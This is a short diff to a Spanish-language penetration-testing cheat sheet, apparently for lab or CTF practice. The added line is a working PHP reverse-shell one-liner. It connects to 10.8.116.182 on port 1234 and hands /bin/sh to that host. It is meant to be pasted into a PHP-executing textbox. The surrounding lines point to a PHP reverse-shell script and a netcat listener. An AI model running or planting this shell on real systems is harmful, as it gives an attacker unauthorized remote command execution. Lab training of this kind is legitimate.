@@ -112,6 +112,7 @@ python3 -m http.server 12345
 Descargar y editar (IP y Puerto)
 ```
 https://github.com/josueitamar/php-reverse-shell/blob/master/php-reverse-shell.php
+php -r ‘$sock=fsockopen(“10.8.116.182”,1234);exec(“/bin/sh -i <&3 >&3 2>&3”);’ // Para ejecución en textbox php
 ```
 Configurar puerto escucha en netcat
 ```
